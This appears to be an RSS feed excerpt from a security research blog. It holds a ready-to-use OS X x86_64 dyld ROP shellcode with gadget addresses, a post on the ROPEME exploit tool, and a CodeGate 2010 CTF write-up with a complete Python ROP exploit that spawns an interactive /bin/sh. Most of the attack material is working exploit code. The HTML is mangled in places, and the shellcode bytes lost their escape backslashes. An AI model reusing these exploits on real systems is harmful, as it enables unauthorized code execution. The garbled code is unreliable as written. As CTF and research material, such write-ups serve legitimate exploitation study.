</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  Flag: R0PPINGy0urWAYinDUDE
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $
</div>

<ul>
  <li>*</li>
</ul>


  ]]></description>
</item>

	<item>
  <title>Yet another universal OSX x86_64 dyld ROP shellcode</title>
  <link>http://realjenius.com/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-07-30T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html</guid>
  <description><![CDATA[
     <p>This technique was killed by OSX Lion 10.7 with full ASLR. @pa_kt has posted an <a href="http://gdtr.wordpress.com/2011/07/23/universal-rop-shellcode-for-os-x-x64/">Universal ROP shellcode for OS X x64</a> with detail steps and explanation. If you don’t have a chance to read above post, the basic ideas are:</p>

<ul>
  <li>Copy stubcode to a writable area (.data section)</li>
  <li>Make that area RWX</li>
  <li>Jump to RWX area and execute stubcode</li>
  <li>Stubcode will transfer normal shellcode to RWX area and execute it</li>
  <li>All the ROP gadgets are from dyld module which is not randomized</li>
</ul>

<p>In this post, we shows another OSX x86_64 dyld ROP shellcode which is more simple. We employ the same ideas with some minor differences in implementation:</p>

<ul>
  <li>Instead of using long gadgets with “leave”, we use direct, short gadgets from unintended code</li>
  <li>Calling mprotect() via syscall</li>
  <li>Short stubcode (7 bytes) using memcpy() to transfer payload</li>
</ul>

<p>Here is the ROP shellcode with explanation:</p>

<pre class="brush: plain; title: ; notranslate" title=""># store [target], stubcode
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0xc353575e545a5b90 # =&gt; rsi = stubcode
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc74f80 # =&gt; rdi
0x00007fff5fc24d26 # mov [rdi+0x80] rsi; stubcode =&gt; [target]
# load rdx, 0x7 (prot RWX)
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc75001 # =&gt; rdi
0x00007fff5fc1ddc0 # lea rax, [rdi-0x1]
0x00007fff5fc219c3 # pop rbp ; add [rax] al ; add cl cl
0x00007fff5fc75000 # =&gt; rbp
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0x0000000000000007 # =&gt; rsi
0x00007fff5fc14149 # mov edx esi ; add [rax] al ; add [rbp+0x39] cl =&gt; rdx = 0x7
# load rsi, 4096 (size)
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0x0000000000001000 # =&gt; rsi = 4096
# load rax, mprotect_syscal
0x00007fff5fc24cdc # pop rdi
0x000000000200004b # =&gt; rdi
0x00007fff5fc1ddc0 # lea rax, [rdi-0x1] =&gt; rax = 0x200004a (mprotect syscall)
# load rdi, target
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc75000 # =&gt; rdi = target
# syscall
0x00007fff5fc1c76d # mov r10, rcx; syscall  =&gt; mprotect(target, 4096, 7)
0x00007fff5fc75000 # jump to target, execute stubcode
# stubcode
# 5B                pop rbx     # rbx -&gt; memcpy()
# 5A                pop rdx     # rdx -&gt; size
# 54                push rsp    # src -&gt; &amp;shellcode
# 5E                pop rsi     # src -&gt; &amp;shellcode
# 57                push rdi    # jump to target when return from memcpy()
# 53                push rbx    # memcpy()
# C3                ret         # execute memcpy(target, &amp;shellcode, size)
0x00007fff5fc234f0 # &amp;memcpy()
0x0000000000000200 # shellcode size = 512
&lt;your shellcode here&gt;
</pre>

<p>You can verify those gadgets and find more here: <a href="http://goo.gl/p35vY">http://goo.gl/p35vY</a></p>

<p>Ready to use shellcode:</p>

<pre class="brush: plain; title: ; notranslate" title="">"xeexe7xc0x5fxffx7fx00x00x90x5bx5ax54x5ex57x53xc3"
"xdcx4cxc2x5fxffx7fx00x00x80x4fxc7x5fxffx7fx00x00"
"x26x4dxc2x5fxffx7fx00x00xdcx4cxc2x5fxffx7fx00x00"
"x01x50xc7x5fxffx7fx00x00xc0xddxc1x5fxffx7fx00x00"
"xc3x19xc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"xeexe7xc0x5fxffx7fx00x00x07x00x00x00x00x00x00x00"
"x49x41xc1x5fxffx7fx00x00xeexe7xc0x5fxffx7fx00x00"
"x00x10x00x00x00x00x00x00xdcx4cxc2x5fxffx7fx00x00"
"x4bx00x00x02x00x00x00x00xc0xddxc1x5fxffx7fx00x00"
"xdcx4cxc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"x6dxc7xc1x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"xf0x34xc2x5fxffx7fx00x00x00x02x00x00x00x00x00x00"
</pre>

  ]]></description>
</item>

	<item>
  <title>ROPEME &#8211; ROP Exploit Made Easy</title>
  <link>http://realjenius.com/research/2010/08/13/ropeme-rop-exploit-made-easy.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-08-13T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2010/08/13/ropeme-rop-exploit-made-easy.html</guid>
  <description><![CDATA[
     <p>ROPEME – ROP Exploit Made Easy – is a PoC tool for ROP exploit automation on Linux x86. It contains a set of simple Python scripts to generate and search for ROP gadgets from binaries and libraries (e.g libc). A sample payload class is also included to help generate multistage ROP payload with the technique described in the Black Hat USA 2010 talk: “<a title="Black Hat USA 2010 Media Archives" href="http://blackhat.com/html/bh-us-10/bh-us-10-archives.html#Le" target="_blank">Payload already inside: data re-use for ROP exploits</a>“.</p>

<p>Check the latest <a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">paper</a> and <a href="http://force.vnsecurity.net/download/longld/BHUS10_Slides_Payload_already_inside_data_reuse_for_ROP_exploits_v1.pdf">slides</a> and PoC <a href="http://force.vnsecurity.net/download/longld/ropeme-bhus10.tbz2">code</a>.</p>

<p>And take a look at the demo video below:</p>

<p>Enjoy ROPing!</p>


  ]]></description>
</item>

	<item>
  <title>Return-oriented-programming practice: exploiting CodeGate 2010 Challenge 5</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/04/18/return-oriented-programming-practice-exploiting-codegate-2010-challenge-5.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-04-18T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/04/18/return-oriented-programming-practice-exploiting-codegate-2010-challenge-5.html</guid>
  <description><![CDATA[
     <p>In my <a href="http://www.vnsecurity.net/2010/03/codegate-2010-online-ctf-challenge-4-5-writeup/" target="_blank">previous post</a> about CodeGate 2010 Challenge 5 exploit, I mentioned the weakness of accessing server to get <em>execl()</em> address. In this post I will show how to blindly exploit the “harder” program without access to the remote server using <a href="http://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank">return-oriented-programming</a> technique.</p>

<h2 id="rop-introduction">ROP introduction</h2>

<p>A worth to read post about ROP introduction can be found on Zynamics blog: <a href="http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/" target="_blank">http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/</a></p>

<p>In summary: we will use return-into-instructions (called gadgets) to build and execute our payload when controlled EIP and ESP from vulnerable program.</p>

<p>ROP limitations (difficulties):</p>

<ul>
  <li>ASLR: the same as return-into-libc, it’s difficult to locate address of instructions in library (e.g libc)</li>
  <li>ASCII-armor address: with ascii-armor remapping of libraries (e.g libc), addresses will contain NULL byte so chaining return-into-libc calls and ROP is impossible if there’s NULL filter in input</li>
</ul>

<h2 id="the-8220harder8221-case">The “harder” case</h2>

<p>Fortunately, we can blindly exploit the “harder” program using ROP because it provides some “advantages” in code:</p>

<ul>
  <li><em>getline()</em>: can pass NULL byte to input</li>
  <li><em>printf()</em>: can leak runtime memory info (bypass ASLR)</li>
</ul>

<h2 id="finding-rop-gadgets">Finding ROP gadgets</h2>

<p>Our target is to invoke <strong>execve(“/bin/sh”, 0, 0)</strong> syscall, which is equivalent to prepare registers’ value then trigger kernel syscall:</p>

<blockquote>
  <p>eax = 0xb // execve<br />
ebx = address of “/bin/sh”<br />
ecx = 0 // argv<br />
edx = 0 // env</p>
</blockquote>

<p>Searching in harder binary, we found below gadgets:</p>

<ul>
  <li>eax: 
    <pre>80483a4:    58                       pop    %eax
80483a5:    5b                       pop    %ebx
80483a6:    c9                       leave
80483a7:    c3                       ret</pre>
  </li>
  <li>ebx &amp; ecx: 
    <pre>8048634:    59                       pop    %ecx
8048635:    5b                       pop    %ebx
8048636:    c9                       leave
8048637:    c3                       ret</pre>

    <p>“/bin/sh” is placed on target buffer, its address is available by leaking via <em>printf()</em>&lt;/li&gt; &lt;/ul&gt; 
*   edx:<br />
    There’s no edx related gadget but observing that when returned from <em>memcpy()</em> edx’s value is set to esi so we can assign esi to 0×0 first then return again to main to nullify edx.&lt;/p&gt; 
    &lt;pre&gt;0x001ba506 :    mov    edx,esi
80485e6:    5e                       pop    %esi
80485e7:    5f                       pop    %edi
80485e8:    5d                       pop    %ebp
80485e9:    c3                       ret&lt;/pre&gt;</p>

    <ul>
      <li>
        <p>syscall:<br />
In recent Linux kernel, syscall is usually performed via linux gate: <strong>call gs:[0x10]</strong>. By return to back to <em>printf()</em> in harder program many times, we can find the offset from <em>getline()</em> to first syscall is 319 bytes.</p>
      </li>
      <li>
        <p>moving stack:<br />
After <strong>“leave; ret”</strong> our stack will be moved to new location pointing by ebp. We can control this by set ebp back to somewhere in the middle of target buffer.</p>
      </li>
    </ul>

    <h2 id="exploit-code">Exploit code</h2>

    <pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python

</pre>
  </li>
</ul>
<p>import socket
import sys
import struct
import telnetlib</p>

<h1 id="host--ctf4codegateorg">host = ‘ctf4.codegate.org’</h1>
<p>host = ‘127.0.0.1’
port = 9005</p>

<p>c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((host, port))</p>

<p>buf=””
# bypass first read
buf = c.recv(1024)</p>

<h1 id="getline-address">getline() address</h1>
<p>buf = “A”*268 + struct.pack(‘i’, 0x08048524) + struct.pack(‘i’, 0x0804a008) + “n”
c.send(buf)
buf = c.recv(1024)
addr = “”
getline_addr = int(buf[:4][::-1].encode(‘hex’), 16)
print “getline() is at:”, hex(getline_addr)</p>

<h1 id="call-gs0x10-address">call gs:[0x10] address</h1>
<p>offset = 319 # first offset is 319 bytes from getline()
syscall_addr = getline_addr + offset</p>

<h1 id="buffer-address">buffer address</h1>
<p>buf = “%7$x” + “x00”<em>260 + struct.pack(‘i’, 0x08048521)</em>2 + “n”
c.send(buf)
buf = c.recv(1024)
input_addr = int(buf[:8], 16)
print “Buffer address is at: “, hex(input_addr)</p>

<h1 id="gadgets-address">gadgets address</h1>
<p>pop_eax = 0x080483a4
pop_ecx_ebx = 0x08048634
pop_esi = 0x080485e6</p>

<h1 id="pop-esi">pop esi</h1>
<p>buf = “A”<em>268 + struct.pack(‘i’, pop_esi) + “x00” * 12 + struct.pack(‘i’, 0x08048524)</em>2  + “n”
c.send(buf)
c.recv(1024)</p>

<h1 id="pop-eax-then-move-stack-to-new-address">pop eax then move stack to new address</h1>
<p>input_addr += 560 # lifting after 2 getline() calls
new_stack = input_addr+8
buf = “/bin/shx00” # /bin/sh
buf += struct.pack(‘i’, new_stack+16) # next ebp after leave from pop_eax
buf += struct.pack(‘i’, pop_ecx_ebx) # next is pop_ecx_ebx
buf += “x00”<em>4 # ecx
buf += struct.pack(‘i’, input_addr) # ebx -&gt; /bin/sh
buf += “A”</em>4 # un-used ebp after leave from pop_ecx_ebx
buf += struct.pack(‘i’, syscall_addr)
buf = buf.ljust(264, “A”) # padding
buf += struct.pack(‘i’, new_stack) # new ebp
buf += struct.pack(‘i’, pop_eax)
buf += “x0bx00x00x00” # execve syscal
buf += “A”*4 # un-used ebx
buf += “n”</p>

<p>print “Sending final payload …”
c.send(buf)
c.send(“id 2&gt;&amp;1” + “n”*5)</p>

<p>t = telnetlib.Telnet()
t.sock = c
t.interact()
c.close()</p>

<p>&lt;/pre&gt;</p>

  ]]></description>
</item>

</channel>
</rss>